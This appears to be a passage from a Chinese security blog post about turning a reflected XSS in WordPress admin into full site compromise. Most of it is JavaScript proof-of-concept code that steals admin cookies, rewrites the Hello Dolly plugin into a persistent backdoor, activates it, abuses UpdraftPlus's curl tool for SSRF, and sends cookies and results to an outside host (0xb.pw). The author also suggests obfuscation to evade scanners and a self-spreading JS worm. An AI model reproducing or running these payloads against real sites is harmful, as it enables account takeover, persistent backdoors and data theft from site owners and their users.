            var d = new XMLHttpRequest(); 
            d.open('POST', 'http://xxx', true); 
            d.setRequestHeader("Content-type","application/x-www-form-urlencoded");
            d.send('cookie='+sss)
       }
    }
成功收到了来自目标的cookie。
虽然我们成功的收到了目标的cookie，但是这个cookie可能在一段时间之后就无效了，那么怎么能把这样的一个后门转化为持久的攻击呢。这里我还是建议使用hello
holly这个插件。
这个插件本身是一个非常特殊的插件，在启用情况下，这个插件会被各个页面所包含，但细心的朋友可能会发现，在前面的攻击过程中，由于我们不遵守插件的页面格式，页面内容被替换为``的过程中，也同样的不被识别为插件，我们需要将页面修改为需要的页面格式，并插入我们想要的代码。
当hello.php为这样时，应该是最简页面内容
那么我们来构造完整的攻击请求
1、构造xss攻击链接->管理员点击->修改插件目录的hello.php->启动hello, holly插件->访问首页->触发攻击  
2、hello.php页面直接获取cookie发出。
hello.php
    var d = new XMLHttpRequest(); 
    d.open('POST', 'http://xxx', true); 
    d.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    d.send('cookie=');
这部分的代码看似简单，实际上还有很大的优化空间，就比如：  
1、优化执行条件：通过和远控（xss平台）交互，获取时间戳，和本地时间做对比，如果时间不符合要求不执行，避免管理员在后台的多次访问导致xss平台爆炸。  
2、通过代码混淆等方式，将代码混淆入原本的代码中，避免安全类防御工具在站内扫面时发现此页面。
这里我就不做深究了，完整的写入poc如下
    // 写入后门
    url = window.location.href;
    url = url.split('wp-admin')[0];
    p = 'wp-admin/plugin-editor.php?';
    q = 'file=hello.php';
    s = '%3C%3Fphp%0A%2f%2a%0APlugin%20Name%3A%20Hello%20Dolly%0AVersion%3A%201.6%0A%2a%2f%0A%3F%3E%0A%3Cscript%3E%0Avar%20d%20%3D%20new%20XMLHttpRequest%28%29%3B%20%0Ad.open%28%27POST%27%2C%20%27http%3A%2f%2f0xb.pw%27%2C%20true%29%3B%20%0Ad.setRequestHeader%28%22Content-type%22%2C%22application%2fx-www-form-urlencoded%22%29%3B%0Ad.send%28%27cookie%3D%3C%3Fphp%20echo%20urlencode%28implode%28%27%23%27%2C%20%24_COOKIE%29%29%3F%3E%27%29%3B%0A%3C%2fscript%3E';
    a = new XMLHttpRequest();
    a.open('GET', url+p+q, 0);
    a.send();
    ss = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
    '&newcontent=' + s + '&action=update&file=hello.php';
    b = new XMLHttpRequest();
    b.open('POST', url+p+q, 1);
    b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    b.send(ss);
    // 开启插件
    b.onreadystatechange = function(){
        if (this.readyState == 4) {
            // 解开启插件的请求回来
            c = new XMLHttpRequest();
            c.open('GET', url+'wp-admin/plugins.php', 0);
            c.send();
            sss = /(data-plugin="hello.php)[\w\s"\'<>=\-选择你好多莉\/[\].?&;]+/.exec(c.responseText);
            sss = /plugins.php([\w.?=&;]+)/.exec(sss)[0];
            sss = sss.replace(/&/gi, '&')
            // 开启插件
            d = new XMLHttpRequest();
            d.open('GET', url+'wp-admin/'+sss, 0);
            d.send();
            // 跳回首页
            setTimeout('location.href='+url+'wp-admin/',2000);
       }
    }
事实上，由于wordpress的特殊性，我们可以通过xss来请求安装插件来简化上面的攻击链，简化整个流程，当我们访问：
    http://wordpress.site/wp-admin/update.php?action=install-plugin&updraftplus_noautobackup=1&plugin=wp-crontrol&_wpnonce=391ece6c0f
wp就会自动安装插件，如果我们将包含恶意代码的模块上传到插件库中，通过上述请求自动安装插件，再启用插件，那么一样可以完整整个攻击。
## xss的破坏式利用
上文中主要是展示了xss配合特性对前端渗透的一些攻击方式，但是很多时候渗透的目的并不一定要隐秘，对于黑产或者其他目的的渗透来说，可能会有一些破坏式的利用方式。
当攻击者的目的并不是为了渗透，而是为了恶作剧、挂黑页，甚至只是为了单纯的搞挂网站，那么就不需要那么复杂的利用链，可以用一些更简单的方法。
这种方式一般应用于储存性xss漏洞点，比较接近恶作剧性质，因为不会危害到网站安全。
攻击和防护的一些思路见  
在前面部分的内容，花了大篇幅来描述XSS在前台中的影响，关于后台的部分只有一部分通过编辑插件实现的XSS to Rce.但实际上还有更多拓展的可能。
## XSS的后端利用
这里首先介绍一个WordPress的插件UpdraftPlus，这是一个用于管理员备份网站的插件，用户量非常大，基本上所有的wordpress使用者都会使用UpdraftPlus来备份他们的网站，在这个插件中，集成了一些小工具，配合我们xss，刚好可以实现很多特别的攻击链。
首先是phpinfo，前面提到，我们可以修改hello
holly这个插件来查看phpinfo，但是如果这个默认插件被删除了，而且又没有合适的方式隐藏phpinfo页面，那么我们可以通过UpdarftPlus来获取phpinfo内容。
这个链接地址为
    wp-admin/admin-ajax.php?page=updraftplus&action=updraft_ajax&subaction=phpinfo&nonce=cbe6c0b062
除了phpinfo以外，我们还可以使用内建的curl工具，这个工具没有对请求地址做任何限制，那么我们就可以使用这个工具来ssrf或者扫描内网。
curl的链接
    wp-admin/admin-ajax.php?action=updraft_ajax&subaction=httpget&nonce=2f2f07ce90&uri=http://127.0.0.1&curl=1
配合js，poc如下：
    url = window.location.href;
    url = url.split('wp-admin')[0];
    p = 'wp-admin/options-general.php?';
    p2 = 'wp-admin/admin-ajax.php?';
    q = 'page=updraftplus&tab=addons';
    s = "http://111111111";
    a = new XMLHttpRequest();
    a.open('GET', url+p+q, 0);
    a.send();
    q2 = 'nonce=' + /credentialtest_nonce='([^']*?)'/.exec(a.responseText)[1] +
    '&uri=' + s + '&action=updraft_ajax&subaction=httpget&curl=1';
    // 发起请求
    b = new XMLHttpRequest();
    b.open('GET', url+p2+q2, 1);
    b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    b.send();
    b.onload = function(){
        if (this.readyState == 4) {
            // 传出请求结果
            var c = new XMLHttpRequest(); 
            c.open('POST', 'http://0xb.pw', true); 
            c.setRequestHeader("Content-type","application/x-www-form-urlencoded");
            c.send('result='+encodeURIComponent(b.responseText))
        }
    }
请求成功了，事实上，如果XSS的交互脚本写的足够好，这里完全可以实现对内网的渗透。
## END：拓展与思考
整篇文章其实是我在对wordpress源码审计时候的一些思考，对于大部分通用类的cms，开发者往往过于相信超级管理员，其中wordpress就是典型代表，开发者认为，网站的超级管理员应该保护好自己的账户。
在这种情况下，一个后台的反射形XSS漏洞往往会造成远远超过预期的危害。一个反射性XSS配合一些设计问题会导致全站的沦陷。
但反射性XSS总有一些缺点  
1、指向性明显，链接必须要网站的超级管理员点击才有效，在实际使用中，你可能很难获知网站的超级管理员是谁。  
2、必须点击链接，最低要求也必须要访问包含你恶意链接的页面。
幸运的是，我们仍然有拓展攻击的方式，在@呆子不开口 FIT2017的议题中，他提到一部分poc的反分析办法，根据这个思路，我们优化我们的poc。
一个完成的恶意链接，甚至可以搭配上js蠕虫，将入侵成功的站点再次演变为新的恶意链接，这样整个攻击链就形成了。
上面所有涉及到的js都上传到了我的[github](https://github.com/LoRexxar/xss_essay)上。欢迎来社区进行讨论。